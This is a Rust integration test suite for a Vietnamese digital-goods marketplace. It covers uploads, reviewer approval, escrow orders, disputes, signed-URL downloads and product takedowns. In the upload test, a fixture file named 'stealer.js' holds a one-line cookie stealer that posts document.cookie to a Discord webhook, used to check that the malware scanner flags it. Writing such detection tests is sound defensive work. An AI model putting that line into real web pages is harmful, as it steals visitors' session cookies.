mod common;

use axum::body::Body;
use axum::http::{header, Method, Request, StatusCode};
use axum::Router;
use common::*;
use ledger::AccountKey;
use serde_json::json;
use server::domain::{escrow, orders, stall};
use sqlx::PgPool;
use tower::ServiceExt;
use uuid::Uuid;

/// Helper gửi multipart upload 1 tệp `file` tới `/api/v1/versions/:id/files`.
async fn upload_file(
    app: &Router,
    version_id: Uuid,
    token: &str,
    filename: &str,
    content_type: &str,
    data: &[u8],
) -> Resp {
    let boundary = "----ChoCongDongBoundary7MA4YWxkTrZu0gW";
    let mut body = Vec::new();
    body.extend_from_slice(
        format!(
            "--{boundary}\r\n\
             Content-Disposition: form-data; name=\"file\"; filename=\"{filename}\"\r\n\
             Content-Type: {content_type}\r\n\r\n"
        )
        .as_bytes(),
    );
    body.extend_from_slice(data);
    body.extend_from_slice(format!("\r\n--{boundary}--\r\n").as_bytes());

    let req = Request::builder()
        .method(Method::POST)
        .uri(format!("/api/v1/versions/{version_id}/files"))
        .header(header::AUTHORIZATION, format!("Bearer {token}"))
        .header(
            header::CONTENT_TYPE,
            format!("multipart/form-data; boundary={boundary}"),
        )
        .body(Body::from(body))
        .expect("multipart request");
    send(app, req).await
}

/// Helper tạo seller có gian hàng còn hạn, tạo sản phẩm, upload tệp sạch và cho reviewer duyệt lên sàn.
async fn setup_approved_product(
    app: &Router,
    pool: &PgPool,
    seller: &Session,
    reviewer: &Session,
    category_id: i16,
    price: i64,
    file_bytes: &[u8],
) -> (Uuid, Uuid, Uuid) {
    fund(pool, AccountKey::wallet_spendable(seller.user_id), 200_000).await;
    stall::rent(
        pool,
        seller.user_id,
        stall::Source::Spendable,
        Some("Shop Công Cụ Số"),
        None,
    )
    .await
    .expect("thuê gian hàng");

    let prod = post(
        app,
        "/api/v1/products",
        json!({
            "category_id": category_id,
            "title": "Script Tự Động Hóa Pro",
            "price": price,
            "description_md": "# Hướng dẫn\nChạy ổn định.",
            "requirements": "Python 3.10+"
        }),
        Some(&seller.access),
    )
    .await;
    assert_eq!(prod.status, StatusCode::CREATED, "tạo sp: {:?}", prod.body);
    let product_id = Uuid::parse_str(prod.body["id"].as_str().unwrap()).unwrap();

    let ver = post(
        app,
        &format!("/api/v1/products/{product_id}/versions"),
        json!({ "version": "1.0.0", "changelog": "Phát hành lần đầu" }),
        Some(&seller.access),
    )
    .await;
    assert_eq!(ver.status, StatusCode::CREATED, "tạo ver: {:?}", ver.body);
    let version_id = Uuid::parse_str(ver.body["id"].as_str().unwrap()).unwrap();

    let up = upload_file(
        app,
        version_id,
        &seller.access,
        "tool-v1.py",
        "text/x-python",
        file_bytes,
    )
    .await;
    assert_eq!(up.status, StatusCode::CREATED, "upload: {:?}", up.body);
    let file_id = Uuid::parse_str(up.body["file"]["id"].as_str().unwrap()).unwrap();

    let sub = post(
        app,
        &format!("/api/v1/versions/{version_id}/submit"),
        json!({ "commitment_accepted": true }),
        Some(&seller.access),
    )
    .await;
    assert_eq!(sub.status, StatusCode::OK, "submit: {:?}", sub.body);

    let claim = post(
        app,
        &format!("/api/v1/review/versions/{version_id}/claim"),
        json!({}),
        Some(&reviewer.access),
    )
    .await;
    assert_eq!(claim.status, StatusCode::OK, "claim: {:?}", claim.body);

    let cl = post(
        app,
        &format!("/api/v1/review/versions/{version_id}/checklist"),
        json!({
            "runs_as_described": true,
            "no_malicious_behavior": true,
            "no_copyright_violation": true,
            "adequate_instructions": true,
            "no_account_theft": true,
            "no_tos_abuse": true,
            "sandbox_verified": true,
            "notes": "Đã test trong VM"
        }),
        Some(&reviewer.access),
    )
    .await;
    assert_eq!(cl.status, StatusCode::OK, "checklist: {:?}", cl.body);
    assert_eq!(cl.body["passed"], json!(true));

    let dec = post(
        app,
        &format!("/api/v1/review/versions/{version_id}/decision"),
        json!({ "decision": "approved" }),
        Some(&reviewer.access),
    )
    .await;
    assert_eq!(dec.status, StatusCode::OK, "approve: {:?}", dec.body);

    (product_id, version_id, file_id)
}

#[sqlx::test(migrator = "server::MIGRATOR")]
async fn settings_phase3_mac_dinh_va_cap_nhat(pool: PgPool) {
    let (app, _) = test_app(pool.clone());
    let admin = register_admin(&app, &pool, "admin-s3@example.com").await;

    let r = get(&app, "/api/v1/admin/settings", Some(&admin.access)).await;
    assert_eq!(r.status, StatusCode::OK);
    assert_eq!(r.body["settings"]["max_upload_mb"], json!(100));
    assert_eq!(r.body["settings"]["download_limit"], json!(5));
    let allow = r.body["settings"]["file_ext_allowlist"]
        .as_array()
        .expect("allowlist array");
    assert!(allow.iter().any(|v| v == "zip"));
    assert!(!allow.iter().any(|v| v == "exe"));

    // Cập nhật hợp lệ
    let p = patch(
        &app,
        "/api/v1/admin/settings",
        json!({ "settings": { "download_limit": 8, "file_ext_allowlist": ["zip", "pdf"] } }),
        Some(&admin.access),
    )
    .await;
    assert_eq!(p.status, StatusCode::OK);
    assert_eq!(p.body["settings"]["download_limit"], json!(8));

    // Đuôi không hợp lệ bị chặn
    let bad = patch(
        &app,
        "/api/v1/admin/settings",
        json!({ "settings": { "file_ext_allowlist": [".EXE"] } }),
        Some(&admin.access),
    )
    .await;
    assert_eq!(bad.status, StatusCode::BAD_REQUEST);
}

#[sqlx::test(migrator = "server::MIGRATOR")]
async fn upload_kiem_tra_duoi_dung_luong_va_quet_chuoi(pool: PgPool) {
    let (app, _) = test_app(pool.clone());
    let seller = register(&app, "seller-up@example.com").await;
    fund(&pool, AccountKey::wallet_spendable(seller.user_id), 200_000).await;
    stall::rent(
        &pool,
        seller.user_id,
        stall::Source::Spendable,
        Some("Shop Upload"),
        None,
    )
    .await
    .unwrap();

    let prod = post(
        &app,
        "/api/v1/products",
        json!({ "category_id": 1, "title": "Tool Upload Test", "price": 50_000 }),
        Some(&seller.access),
    )
    .await;
    let product_id = Uuid::parse_str(prod.body["id"].as_str().unwrap()).unwrap();
    let ver = post(
        &app,
        &format!("/api/v1/products/{product_id}/versions"),
        json!({ "version": "1.0.0" }),
        Some(&seller.access),
    )
    .await;
    let version_id = Uuid::parse_str(ver.body["id"].as_str().unwrap()).unwrap();

    // .exe bị chặn theo allowlist
    let exe = upload_file(
        &app,
        version_id,
        &seller.access,
        "setup.exe",
        "application/octet-stream",
        b"MZfake",
    )
    .await;
    assert_eq!(exe.status, StatusCode::BAD_REQUEST);
    assert_eq!(exe.body["error"]["code"], json!("disallowed_file_type"));

    // Hạ max_upload_mb xuống 1MB và thử vượt giới hạn
    set_setting(&pool, "max_upload_mb", json!(1)).await;
    let big = vec![b'a'; 1024 * 1024 + 10];
    let over = upload_file(
        &app,
        version_id,
        &seller.access,
        "big.txt",
        "text/plain",
        &big,
    )
    .await;
    assert_eq!(over.status, StatusCode::BAD_REQUEST);
    assert_eq!(over.body["error"]["code"], json!("file_too_large"));

    // Nội dung có chuỗi đáng ngờ vẫn lưu báo cáo auto với scan_status = suspicious
    let sus = upload_file(
        &app,
        version_id,
        &seller.access,
        "stealer.js",
        "text/javascript",
        b"fetch('https://discord.com/api/webhooks/1', { body: document.cookie });",
    )
    .await;
    assert_eq!(sus.status, StatusCode::CREATED);
    assert_eq!(sus.body["file"]["scan_status"], json!("suspicious"));
    assert!(sus.body["suspicious_findings"].as_array().unwrap().len() >= 2);
}

#[sqlx::test(migrator = "server::MIGRATOR")]
async fn quy_trinh_duyet_san_pham_va_phien_ban_moi(pool: PgPool) {
    let (app, _) = test_app(pool.clone());
    let seller = register(&app, "seller-rev@example.com").await;
    let reviewer = register(&app, "reviewer@example.com").await;
    grant_role(&pool, reviewer.user_id, "reviewer").await;
    // Cho seller cũng có vai reviewer để kiểm tra cấm tự duyệt sản phẩm mình
    grant_role(&pool, seller.user_id, "reviewer").await;

    // Dùng danh mục rủi ro cao (3 = MMO Tool)
    let (product_id, v1_id, _) =
        setup_approved_product(&app, &pool, &seller, &reviewer, 3, 150_000, b"print('v1')").await;

    // Trang chi tiết công khai hiển thị bản 1.0.0 và không lộ object_key
    let detail = get(&app, &format!("/api/v1/products/{product_id}"), None).await;
    assert_eq!(detail.status, StatusCode::OK);
    assert_eq!(detail.body["published_version"]["version"], json!("1.0.0"));
    assert!(detail.body["files"][0].get("object_key").is_none());

    // Tạo bản cập nhật v2, nộp duyệt: bản v1 vẫn đang bán bình thường
    let v2 = post(
        &app,
        &format!("/api/v1/products/{product_id}/versions"),
        json!({ "version": "2.0.0", "changelog": "Cập nhật tính năng mới" }),
        Some(&seller.access),
    )
    .await;
    let v2_id = Uuid::parse_str(v2.body["id"].as_str().unwrap()).unwrap();
    let up2 = upload_file(
        &app,
        v2_id,
        &seller.access,
        "tool-v2.py",
        "text/x-python",
        b"print('v2')",
    )
    .await;
    assert_eq!(up2.status, StatusCode::CREATED);
    let sub2 = post(
        &app,
        &format!("/api/v1/versions/{v2_id}/submit"),
        json!({ "commitment_accepted": true }),
        Some(&seller.access),
    )
    .await;
    assert_eq!(sub2.status, StatusCode::OK);

    // Người bán tự nhận duyệt sản phẩm mình bị chặn (403)
    let self_claim = post(
        &app,
        &format!("/api/v1/review/versions/{v2_id}/claim"),
        json!({}),
        Some(&seller.access),
    )
    .await;
    assert_eq!(self_claim.status, StatusCode::FORBIDDEN);

    // Reviewer nhận test v2, gửi checklist thiếu mục high-risk -> passed = false -> duyệt bị chặn
    assert_eq!(
        post(
            &app,
            &format!("/api/v1/review/versions/{v2_id}/claim"),
            json!({}),
            Some(&reviewer.access)
        )
        .await
        .status,
        StatusCode::OK
    );
    let weak_cl = post(
        &app,
        &format!("/api/v1/review/versions/{v2_id}/checklist"),
        json!({
            "runs_as_described": true,
            "no_malicious_behavior": true,
            "no_copyright_violation": true,
            "adequate_instructions": true
        }),
        Some(&reviewer.access),
    )
    .await;
    assert_eq!(weak_cl.body["passed"], json!(false));
    let blocked = post(
        &app,
        &format!("/api/v1/review/versions/{v2_id}/decision"),
        json!({ "decision": "approved" }),
        Some(&reviewer.access),
    )
    .await;
    assert_eq!(blocked.status, StatusCode::UNPROCESSABLE_ENTITY);

    // Từ chối v2: bản v1 vẫn đang published trên sàn
    let rej = post(
        &app,
        &format!("/api/v1/review/versions/{v2_id}/decision"),
        json!({ "decision": "rejected", "reason": "Thiếu kiểm tra sandbox" }),
        Some(&reviewer.access),
    )
    .await;
    assert_eq!(rej.status, StatusCode::OK);
    let detail_after_rej = get(&app, &format!("/api/v1/products/{product_id}"), None).await;
    assert_eq!(
        detail_after_rej.body["published_version"]["id"],
        json!(v1_id)
    );
}

#[sqlx::test(migrator = "server::MIGRATOR")]
async fn mua_hang_escrow_xac_nhan_va_tu_hoan_tat(pool: PgPool) {
    let (app, _) = test_app(pool.clone());
    let seller = register(&app, "seller-ord@example.com").await;
    let reviewer = register(&app, "rev-ord@example.com").await;
    let buyer1 = register(&app, "buyer1@example.com").await;
    let buyer2 = register(&app, "buyer2@example.com").await;
    grant_role(&pool, reviewer.user_id, "reviewer").await;

    let (product_id, _, _) =
        setup_approved_product(&app, &pool, &seller, &reviewer, 1, 250_000, b"code").await;

    // Người bán không thể tự mua sản phẩm mình
    let self_buy = post(
        &app,
        "/api/v1/orders",
        json!({ "product_id": product_id }),
        Some(&seller.access),
    )
    .await;
    assert_eq!(self_buy.status, StatusCode::BAD_REQUEST);

    // Người mua thiếu tiền bị chặn
    let poor = post(
        &app,
        "/api/v1/orders",
        json!({ "product_id": product_id }),
        Some(&buyer1.access),
    )
    .await;
    assert_eq!(poor.status, StatusCode::UNPROCESSABLE_ENTITY);

    // Nạp tiền và mua thành công -> trừ wallet_spendable, cộng escrow
    fund(&pool, AccountKey::wallet_spendable(buyer1.user_id), 300_000).await;
    let ord1 = post_with(
        &app,
        "/api/v1/orders",
        json!({ "product_id": product_id }),
        Some(&buyer1.access),
        &[("idempotency-key", "buy-key-1")],
    )
    .await;
    assert_eq!(ord1.status, StatusCode::CREATED);
    let order1_id = Uuid::parse_str(ord1.body["order"]["id"].as_str().unwrap()).unwrap();
    assert_eq!(
        balance(&pool, AccountKey::wallet_spendable(buyer1.user_id)).await,
        50_000
    );
    assert_eq!(balance(&pool, AccountKey::escrow(order1_id)).await, 250_000);

    // Gọi lặp cùng idempotency-key trả lại đơn cũ, không trừ tiền lần 2
    let replay = post_with(
        &app,
        "/api/v1/orders",
        json!({ "product_id": product_id }),
        Some(&buyer1.access),
        &[("idempotency-key", "buy-key-1")],
    )
    .await;
    assert_eq!(replay.status, StatusCode::OK);
    assert_eq!(replay.body["replayed"], json!(true));

    // Không cho mua lại cùng sản phẩm lần 2
    let dup = post(
        &app,
        "/api/v1/orders",
        json!({ "product_id": product_id }),
        Some(&buyer1.access),
    )
    .await;
    assert_eq!(dup.status, StatusCode::CONFLICT);

    // Người mua 1 xác nhận hoàn tất -> escrow -> earnings_pending
    let conf = post(
        &app,
        &format!("/api/v1/orders/{order1_id}/confirm"),
        json!({}),
        Some(&buyer1.access),
    )
    .await;
    assert_eq!(conf.status, StatusCode::OK);
    assert_eq!(conf.body["status"], json!("completed"));
    assert_eq!(balance(&pool, AccountKey::escrow(order1_id)).await, 0);
    assert_eq!(
        balance(&pool, AccountKey::earnings_pending(seller.user_id)).await,
        250_000
    );

    // Người mua 2 mua và để job tự hoàn tất sau auto_complete_days
    fund(&pool, AccountKey::wallet_spendable(buyer2.user_id), 250_000).await;
    let ord2 = post(
        &app,
        "/api/v1/orders",
        json!({ "product_id": product_id }),
        Some(&buyer2.access),
    )
    .await;
    let order2_id = Uuid::parse_str(ord2.body["order"]["id"].as_str().unwrap()).unwrap();
    sqlx::query("UPDATE orders SET auto_complete_at = now() - interval '1 minute' WHERE id = $1")
        .bind(order2_id)
        .execute(&pool)
        .await
        .unwrap();
    assert_eq!(orders::auto_complete_due(&pool, 100).await.unwrap(), 1);
    assert_eq!(
        balance(&pool, AccountKey::earnings_pending(seller.user_id)).await,
        500_000
    );

    // Hết hold_days -> release_due nhả sang earnings_available
    sqlx::query("UPDATE earnings_holds SET release_at = now() - interval '1 minute'")
        .execute(&pool)
        .await
        .unwrap();
    assert_eq!(escrow::release_due(&pool, 100).await.unwrap(), 2);
    assert_eq!(
        balance(&pool, AccountKey::earnings_pending(seller.user_id)).await,
        0
    );
    assert_eq!(
        balance(&pool, AccountKey::earnings_available(seller.user_id)).await,
        500_000
    );
    assert_books_clean(&pool).await;
}

#[sqlx::test(migrator = "server::MIGRATOR")]
async fn tranh_chap_hoan_tien_tu_escrow_va_tu_pending(pool: PgPool) {
    let (app, _) = test_app(pool.clone());
    let admin = register_admin(&app, &pool, "admin-disp@example.com").await;
    let seller = register(&app, "seller-disp@example.com").await;
    let reviewer = register(&app, "rev-disp@example.com").await;
    let buyer1 = register(&app, "buyer-d1@example.com").await;
    let buyer2 = register(&app, "buyer-d2@example.com").await;
    let buyer3 = register(&app, "buyer-d3@example.com").await;
    grant_role(&pool, reviewer.user_id, "reviewer").await;

    let (product_id, _, _) =
        setup_approved_product(&app, &pool, &seller, &reviewer, 1, 200_000, b"pkg").await;

    // 1) Tranh chấp khi tiền còn ở escrow -> admin hoàn tiền người mua
    fund(&pool, AccountKey::wallet_spendable(buyer1.user_id), 200_000).await;
    let o1 = post(
        &app,
        "/api/v1/orders",
        json!({ "product_id": product_id }),
        Some(&buyer1.access),
    )
    .await;
    let o1_id = Uuid::parse_str(o1.body["order"]["id"].as_str().unwrap()).unwrap();
    let d1 = post(
        &app,
        &format!("/api/v1/orders/{o1_id}/disputes"),
        json!({ "reason": "Tệp chạy lỗi không đúng mô tả" }),
        Some(&buyer1.access),
    )
    .await;
    assert_eq!(d1.status, StatusCode::CREATED);
    let d1_id = Uuid::parse_str(d1.body["id"].as_str().unwrap()).unwrap();

    // Trong lúc tranh chấp, không tải được tệp
    let dl_blocked = post(
        &app,
        &format!("/api/v1/orders/{o1_id}/downloads"),
        json!({}),
        Some(&buyer1.access),
    )
    .await;
    assert_eq!(dl_blocked.status, StatusCode::FORBIDDEN);

    let r1 = post(
        &app,
        &format!("/api/v1/admin/disputes/{d1_id}/resolve"),
        json!({ "resolution": "refund", "note": "Xác nhận lỗi, hoàn tiền" }),
        Some(&admin.access),
    )
    .await;
    assert_eq!(r1.status, StatusCode::OK);
    assert_eq!(
        balance(&pool, AccountKey::wallet_spendable(buyer1.user_id)).await,
        200_000
    );
    assert_eq!(balance(&pool, AccountKey::escrow(o1_id)).await, 0);

    // 2) Tranh chấp khi đơn đã hoàn tất (đang ở earnings_pending) -> đóng băng hold, hoàn tiền
    fund(&pool, AccountKey::wallet_spendable(buyer2.user_id), 200_000).await;
    let o2 = post(
        &app,
        "/api/v1/orders",
        json!({ "product_id": product_id }),
        Some(&buyer2.access),
    )
    .await;
    let o2_id = Uuid::parse_str(o2.body["order"]["id"].as_str().unwrap()).unwrap();
    post(
        &app,
        &format!("/api/v1/orders/{o2_id}/confirm"),
        json!({}),
        Some(&buyer2.access),
    )
    .await;
    let d2 = post(
        &app,
        &format!("/api/v1/orders/{o2_id}/disputes"),
        json!({ "reason": "Phát hiện lỗi sau khi xác nhận" }),
        Some(&buyer2.access),
    )
    .await;
    assert_eq!(d2.status, StatusCode::CREATED);
    let d2_id = Uuid::parse_str(d2.body["id"].as_str().unwrap()).unwrap();

    // Cho đến hạn release_at nhưng vì đang đóng băng nên job không được nhả
    sqlx::query(
        "UPDATE earnings_holds SET release_at = now() - interval '1 minute' WHERE order_ref = $1",
    )
    .bind(o2_id)
    .execute(&pool)
    .await
    .unwrap();
    assert_eq!(escrow::release_due(&pool, 100).await.unwrap(), 0);
    assert_eq!(
        balance(&pool, AccountKey::earnings_available(seller.user_id)).await,
        0
    );

    let r2 = post(
        &app,
        &format!("/api/v1/admin/disputes/{d2_id}/resolve"),
        json!({ "resolution": "refund", "note": "Hoàn từ earnings_pending" }),
        Some(&admin.access),
    )
    .await;
    assert_eq!(r2.status, StatusCode::OK);
    assert_eq!(
        balance(&pool, AccountKey::wallet_spendable(buyer2.user_id)).await,
        200_000
    );
    assert_eq!(
        balance(&pool, AccountKey::earnings_pending(seller.user_id)).await,
        0
    );

    // 3) Tranh chấp ở earnings_pending nhưng admin xử trả người bán (`release`) -> mở khóa và nhả tiền
    fund(&pool, AccountKey::wallet_spendable(buyer3.user_id), 200_000).await;
    let o3 = post(
        &app,
        "/api/v1/orders",
        json!({ "product_id": product_id }),
        Some(&buyer3.access),
    )
    .await;
    let o3_id = Uuid::parse_str(o3.body["order"]["id"].as_str().unwrap()).unwrap();
    post(
        &app,
        &format!("/api/v1/orders/{o3_id}/confirm"),
        json!({}),
        Some(&buyer3.access),
    )
    .await;
    let d3 = post(
        &app,
        &format!("/api/v1/orders/{o3_id}/disputes"),
        json!({ "reason": "Khiếu nại không có căn cứ" }),
        Some(&buyer3.access),
    )
    .await;
    let d3_id = Uuid::parse_str(d3.body["id"].as_str().unwrap()).unwrap();
    let r3 = post(
        &app,
        &format!("/api/v1/admin/disputes/{d3_id}/resolve"),
        json!({ "resolution": "release", "note": "Sản phẩm đúng mô tả" }),
        Some(&admin.access),
    )
    .await;
    assert_eq!(r3.status, StatusCode::OK);
    sqlx::query(
        "UPDATE earnings_holds SET release_at = now() - interval '1 minute' WHERE order_ref = $1",
    )
    .bind(o3_id)
    .execute(&pool)
    .await
    .unwrap();
    assert_eq!(escrow::release_due(&pool, 100).await.unwrap(), 1);
    assert_eq!(
        balance(&pool, AccountKey::earnings_available(seller.user_id)).await,
        200_000
    );
    assert_books_clean(&pool).await;
}

#[sqlx::test(migrator = "server::MIGRATOR")]
async fn giao_file_signed_url_va_gioi_han_luot_tai(pool: PgPool) {
    let (app, _) = test_app(pool.clone());
    let seller = register(&app, "seller-dl@example.com").await;
    let reviewer = register(&app, "rev-dl@example.com").await;
    let buyer = register(&app, "buyer-dl@example.com").await;
    let stranger = register(&app, "stranger-dl@example.com").await;
    grant_role(&pool, reviewer.user_id, "reviewer").await;

    let payload = b"print('noi dung bi mat cua san pham')\n";
    let (product_id, _, file_id) =
        setup_approved_product(&app, &pool, &seller, &reviewer, 1, 100_000, payload).await;

    fund(&pool, AccountKey::wallet_spendable(buyer.user_id), 100_000).await;
    let ord = post(
        &app,
        "/api/v1/orders",
        json!({ "product_id": product_id }),
        Some(&buyer.access),
    )
    .await;
    let order_id = Uuid::parse_str(ord.body["order"]["id"].as_str().unwrap()).unwrap();

    // Người chưa mua gọi tải bị chặn 403
    let unauth = post(
        &app,
        &format!("/api/v1/orders/{order_id}/downloads"),
        json!({ "file_id": file_id }),
        Some(&stranger.access),
    )
    .await;
    assert_eq!(unauth.status, StatusCode::FORBIDDEN);

    // Người mua tải đủ 5 lượt (download_limit = 5)
    let mut last_url = String::new();
    for i in 1..=5 {
        let dl = post(
            &app,
            &format!("/api/v1/orders/{order_id}/downloads"),
            json!({ "file_id": file_id }),
            Some(&buyer.access),
        )
        .await;
        assert_eq!(dl.status, StatusCode::OK, "lượt {i}: {:?}", dl.body);
        assert_eq!(dl.body["downloads_used"], json!(i));
        assert_eq!(dl.body["download_limit"], json!(5));
        last_url = dl.body["download"]["url"].as_str().unwrap().to_string();
    }

    // Lượt thứ 6 vượt giới hạn bị chặn
    let over = post(
        &app,
        &format!("/api/v1/orders/{order_id}/downloads"),
        json!({ "file_id": file_id }),
        Some(&buyer.access),
    )
    .await;
    assert_eq!(over.status, StatusCode::UNPROCESSABLE_ENTITY);
    assert_eq!(over.body["error"]["code"], json!("download_limit_exceeded"));

    // Tải tệp thật qua signed URL nhận đúng byte gốc
    let path = last_url
        .strip_prefix("http://localhost:8080")
        .expect("path signed url");
    let file_resp = app
        .clone()
        .oneshot(
            Request::builder()
                .method(Method::GET)
                .uri(path)
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(file_resp.status(), StatusCode::OK);
    let got = axum::body::to_bytes(file_resp.into_body(), usize::MAX)
        .await
        .unwrap();
    assert_eq!(got.as_ref(), payload);

    // Giả mạo chữ ký trên signed URL bị từ chối 401
    let tampered = format!("{path}X");
    let bad = get(&app, &tampered, None).await;
    assert_eq!(bad.status, StatusCode::UNAUTHORIZED);
}

#[sqlx::test(migrator = "server::MIGRATOR")]
async fn danh_gia_chi_nguoi_da_mua_va_go_san_pham(pool: PgPool) {
    let (app, _) = test_app(pool.clone());
    let admin = register_admin(&app, &pool, "admin-rv@example.com").await;
    let seller = register(&app, "seller-rv@example.com").await;
    let reviewer = register(&app, "rev-rv@example.com").await;
    let buyer = register(&app, "buyer-rv@example.com").await;
    let non_buyer = register(&app, "other-rv@example.com").await;
    grant_role(&pool, reviewer.user_id, "reviewer").await;

    let (product_id, _, _) =
        setup_approved_product(&app, &pool, &seller, &reviewer, 1, 120_000, b"ok").await;

    // Người chưa mua không được đánh giá
    let no_buy = post(
        &app,
        &format!("/api/v1/products/{product_id}/reviews"),
        json!({ "rating": 5, "body": "Chưa mua mà khen" }),
        Some(&non_buyer.access),
    )
    .await;
    assert_eq!(no_buy.status, StatusCode::FORBIDDEN);

    // Mua rồi mới đánh giá được, chỉ 1 lần
    fund(&pool, AccountKey::wallet_spendable(buyer.user_id), 120_000).await;
    post(
        &app,
        "/api/v1/orders",
        json!({ "product_id": product_id }),
        Some(&buyer.access),
    )
    .await;
    let rv = post(
        &app,
        &format!("/api/v1/products/{product_id}/reviews"),
        json!({ "rating": 5, "body": "Tool chạy mượt" }),
        Some(&buyer.access),
    )
    .await;
    assert_eq!(rv.status, StatusCode::CREATED);
    let dup = post(
        &app,
        &format!("/api/v1/products/{product_id}/reviews"),
        json!({ "rating": 4, "body": "Đánh giá lần 2" }),
        Some(&buyer.access),
    )
    .await;
    assert_eq!(dup.status, StatusCode::CONFLICT);

    let detail = get(&app, &format!("/api/v1/products/{product_id}"), None).await;
    assert_eq!(detail.body["product"]["rating_count"], json!(1));
    assert_eq!(detail.body["product"]["rating_avg"], json!(5.0));

    // Admin gỡ sản phẩm kèm hoàn tiền các đơn còn ở escrow
    let td = post(
        &app,
        &format!("/api/v1/admin/products/{product_id}/takedown"),
        json!({ "reason": "Bị báo cáo vi phạm", "refund_eligible": true }),
        Some(&admin.access),
    )
    .await;
    assert_eq!(td.status, StatusCode::OK);
    assert_eq!(td.body["refunded_orders"], json!(1));
    assert_eq!(
        balance(&pool, AccountKey::wallet_spendable(buyer.user_id)).await,
        120_000
    );

    // Sản phẩm bị gỡ không còn xuất hiện trên trang công khai
    let hidden = get(&app, &format!("/api/v1/products/{product_id}"), None).await;
    assert_eq!(hidden.status, StatusCode::NOT_FOUND);
    assert_books_clean(&pool).await;
}
